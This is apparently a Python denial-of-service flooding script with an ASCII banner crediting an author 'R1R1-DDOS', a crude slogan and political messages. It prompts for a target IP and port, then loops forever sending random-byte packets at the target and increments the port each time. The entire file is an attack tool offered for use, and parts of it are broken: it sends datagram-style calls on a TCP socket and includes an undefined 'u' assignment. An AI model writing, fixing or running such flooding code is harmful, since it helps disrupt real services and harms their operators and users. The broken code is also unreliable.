import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
bytes = random._urandom(999)
#############

os.system("clear")
print("")
print("\033[91m||_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_||\033[0m")
print("\033[91m||                                                                   ||\033[0m")
print("\033[91m||       ±± ±± ±±        ±± ±± ±±                     ±±±            ||\033[0m")     
print("\033[91m||       ±±       ±±     ±±       ±±                ±± ±±            ||\033[0m")       
print("\033[91m||       ±±       ±±     ±±       ±±                   ±±            ||\033[0m")
print("\033[91m||       ±±       ±±     ±±       ±±                   ±±            ||\033[0m")
print("\033[95m||       ±± ±± ±±        ±± ±± ±±        ________      ±±            ||\033[0m")
print("\033[95m||       ±±   ±±         ±±   ±±         ±± ±± ±±      ±±            ||\033[0m")
print("\033[95m||       ±±     ±±       ±±     ±±                     ±±            ||\033[0m")
print("\033[95m||       ±±       ±±     ±±       ±±                ±± ±± ±±         ||\033[0m")
print("\033[97m||                                                                   ||\033[0m")     
print("\033[95m||      Author  :  R1R1-DDOS                                         ||\033[0m")
print("\033[96m||      Github  :  https://github.com/Z4CX-DDOS                      ||\033[0m")
print("\033[94m||                 Fucking genocide                                  ||\033[0m")
print("\033[33m||_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_||\033[0m")         
ip = str(input("\033[93m[\033[93m+\033[92m]IP Target : "))
port = int(input("\033[92m[\033[95m+\033[92m]Port : "))
packs = int(input("\033[92m[\033[95m+\033[92m]Packets{0} : "))
thread = int(input("\033[92m[\033[95m+\033[92m]Threads : "))
time.sleep(5),
print("\033[96m[\033[31m+\033[96m]       DON'T \033[0m "),
time.sleep(5),
print("\033[92m[\033[31m+\033[92m] -------------⟩⟩ STOP \033[0m "),
time.sleep(5),
print("\033[94m[\033[31m+\033[94m] ------------------⟩⟩ FIGHT \033[0m "),
time.sleep(5),
print("\033[97m[\033[31m+\033[97m] ----------------------⟩⟩ FOR THE SAKE \033[0m "),
time.sleep(5),
print("\033[95m[\033[31m+\033[95m] -------------------------⟩⟩  FREE PALESTINE \033[0m ")

sent = 0
str = u
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print(f"\033[97m[\033[99m+\033[97m]   Ririe  \033[94mPacket:::... " +ip+ "\033[0m" )
     print("\033[33m———————————————————————————————————————————⟩⟩")
     sent = sent + 1
     port = port + 1
     print(f"\033[93m[\033[99m+\033[93m]   Attack  \033[95mWebs:::.... " +ip+ "\033[0m" )
     print("\033[94m———————————————————————————————————————————⟩⟩")
     sent = sent + 1
     port = port + 1
     print(f"\033[95m[\033[99m+\033[95m]   Request  \033[32mFull:::... " +ip+ "\033[0m" )
     print("\033[31m———————————————————————————————————————————⟩⟩")
     if port == 65534:
       port = 1
